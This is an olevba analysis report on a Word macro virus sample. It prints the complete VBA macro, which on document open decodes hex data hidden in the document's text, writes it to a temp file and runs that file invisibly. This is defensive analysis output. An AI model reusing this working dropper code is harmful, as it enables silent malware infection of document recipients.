olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hidden.a
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Hidden.a 
in file: Virus.MSWord.Hidden.a - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Sub WinExec Lib "Kernel32" (ByVal File As String, ByVal CmdShow As Long)
Private Sub Document_Open()
Macro0
End Sub
Sub Macro0()
                                                                                           
Dim ReadData, Data, TempPath As String
Dim Pos As Long
Dim DataByte As Byte
                                                                                           
ActiveDocument.ActiveWindow.View.ShowAll = False
ActiveDocument.ActiveWindow.View.ShowHiddenText = False
                                                                                           
Set TextRange = ActiveDocument.Content
TextRange.TextRetrievalMode.IncludeHiddenText = True
                                                                                           
Data = TextRange.Text
                                                                                           
TextRange.Find.ClearFormatting
TextRange.Find.Font.Hidden = True
TextRange.Find.Replacement.ClearFormatting
With TextRange.Find
    .Text = ""
    .Replacement.Text = " "
    .Forward = True
    .Wrap = wdFindContinue
    .Format = True
    .MatchCase = False
    .MatchWholeWord = False
    .MatchWildcards = False
    .MatchSoundsLike = False
    .MatchAllWordForms = False
End With
TextRange.Find.Execute Replace:=wdReplaceAll
                                                                                           
ReadData = "START_CODE"
Pos = InStr(TextRange.Text, ReadData)
Pos = InStr(Data, ReadData)
Data = Mid(Data, Pos + Len(ReadData))
Pos = InStr(Data, "END_CODE")
Data = Left(Data, Pos - 1)
                                                                                           
TempPath = Options.DefaultFilePath(wdTempFilePath) + "\"
                                                                                           
Open TempPath + "Docs_2.tmp" For Binary Access Write As #1
For i = 1 To Len(Data) Step 2
  DataByte = Val("&H" + Mid(Data, i, 2))
  Put #1, , DataByte
Next i
Close #1
                                                                                           
Call WinExec(TempPath + "Docs_2.tmp", 0)
ActiveDocument.AttachedTemplate = NormalTemplates
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

